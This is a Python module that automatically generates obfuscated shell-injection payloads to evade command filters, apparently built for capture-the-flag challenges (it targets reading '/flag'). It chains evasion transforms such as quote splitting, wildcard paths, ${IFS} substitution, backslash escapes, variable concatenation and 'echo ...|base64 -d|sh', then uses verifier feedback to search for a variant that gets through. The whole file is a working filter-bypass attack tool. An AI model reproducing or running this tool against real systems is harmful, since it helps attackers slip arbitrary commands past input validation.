
from __future__ import annotations

import base64
import re
from dataclasses import dataclass
from typing import Callable, List, Optional, Tuple


@dataclass(frozen=True)
class Plan:
    payload: str
    operators: Tuple[str, ...]
    reliability: int


def _quote_split(cmd: str) -> Optional[str]:
    head, sep, tail = cmd.partition(" ")
    if len(head) < 2 or "'" in head:
        return None
    mid = len(head) // 2
    return head[:mid] + "''" + head[mid:] + sep + tail


def _wildcard(cmd: str) -> Optional[str]:
    match = re.search(r"(/[^\s]+)$", cmd)
    if not match:
        return None
    path = match.group(1)
    head, _, leaf = path.rpartition("/")
    if len(leaf) < 2:
        return None
    return cmd[: match.start(1)] + head + "/" + "?" * len(leaf)


def _ifs(cmd: str) -> Optional[str]:
    if " " not in cmd:
        return None
    return cmd.replace(" ", "${IFS}")


def _backslash(cmd: str) -> Optional[str]:
    head, sep, tail = cmd.partition(" ")
    for index, char in enumerate(head):
        if char.isalpha() and (index == 0 or head[index - 1] != "\\"):
            return head[:index] + "\\" + head[index:] + sep + tail
    return None


def _concat(cmd: str) -> Optional[str]:
    head, sep, tail = cmd.partition(" ")
    if len(head) < 2:
        return None
    mid = len(head) // 2
    return (
        "${a}=" + head[:mid] + ";${b}=" + head[mid:] + ";${a}${b}" + sep + tail
    )


def _base64(cmd: str) -> Optional[str]:
    data = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
    return "echo " + data + "|base64 -d|sh"


OPERATORS: Tuple[Tuple[str, Callable[[str], Optional[str]], int], ...] = (
    ("quote", _quote_split, 2),
    ("wildcard", _wildcard, 2),
    ("backslash", _backslash, 2),
    ("ifs", _ifs, 1),
    ("concat", _concat, 1),
    ("base64", _base64, 1),
)


def _expand(cmd: str, depth: int, max_candidates: int) -> List[Plan]:
    frontier = [Plan(cmd, (), 3)]
    seen = {cmd}
    results: List[Plan] = []
    for _ in range(depth):
        next_frontier: List[Plan] = []
        for plan in frontier:
            for name, operator, reliability in OPERATORS:
                try:
                    transformed = operator(plan.payload)
                except Exception:
                    transformed = None
                if not transformed or transformed in seen:
                    continue
                seen.add(transformed)
                next_plan = Plan(
                    transformed,
                    plan.operators + (name,),
                    min(plan.reliability, reliability),
                )
                next_frontier.append(next_plan)
                results.append(next_plan)
                if len(results) >= max_candidates:
                    return results
        frontier = next_frontier
        if not frontier:
            break
    return results


def generate_plans(
    command: str,
    depth: int = 2,
    max_candidates: int = 60,
) -> List[Plan]:
    plans = _expand(command, depth, max_candidates)
    plans.sort(key=lambda item: (-item.reliability, len(item.payload), item.payload))
    return plans


def generate(
    command: str,
    depth: int = 2,
    max_candidates: int = 60,
) -> List[str]:
    return [plan.payload for plan in generate_plans(command, depth, max_candidates)]


def feedback_search(
    command: str,
    batch_verifier,
    depth: int = 3,
    rounds: int = 2,
    top_k: int = 6,
    max_candidates: int = 120,
) -> str:
    plans = generate_plans(command, depth, max_candidates)
    stats = {name: [0, 0] for name, _, _ in OPERATORS}
    tried = set()
    for _ in range(rounds):
        batch = [plan for plan in plans if plan.payload not in tried][:top_k]
        seen_operators = {operator for plan in batch for operator in plan.operators}
        for plan in plans:
            if plan.payload in tried or plan in batch:
                continue
            fresh = [
                operator
                for operator in plan.operators
                if operator not in seen_operators and stats[operator][0] == 0
            ]
            if fresh:
                batch.append(plan)
                seen_operators.update(plan.operators)
                if len(batch) >= top_k * 2:
                    break
        if not batch:
            break
        passed = set(batch_verifier([plan.payload for plan in batch]) or [])
        for plan in batch:
            tried.add(plan.payload)
            for operator in plan.operators:
                if operator not in stats:
                    continue
                stats[operator][0] += 1
                if plan.payload in passed:
                    stats[operator][1] += 1
        if passed:
            return min(passed, key=len)
        def score(plan):
            rates = [
                stats[operator][1] / stats[operator][0]
                for operator in plan.operators
                if operator in stats and stats[operator][0]
            ]
            return (
                sum(rates) / len(rates) if rates else 0.0,
                plan.reliability,
                -len(plan.payload),
            )
        plans.sort(key=score, reverse=True)
    return ""


def plan_for_options(options, depth: int = 3, max_candidates: int = 120) -> List[str]:
    if getattr(options, "payload_context", "any") not in {"shell_command", "any"}:
        return []
    path = getattr(options, "flagfile", "") or "/flag"
    if path == "/":
        return []
    commands = ["cat " + path, "nl " + path, "tac " + path]
    out: List[str] = []
    seen = set()
    for command in commands:
        for payload in generate(command, depth=depth, max_candidates=max_candidates):
            if payload not in seen:
                seen.add(payload)
                out.append(payload)
    return out
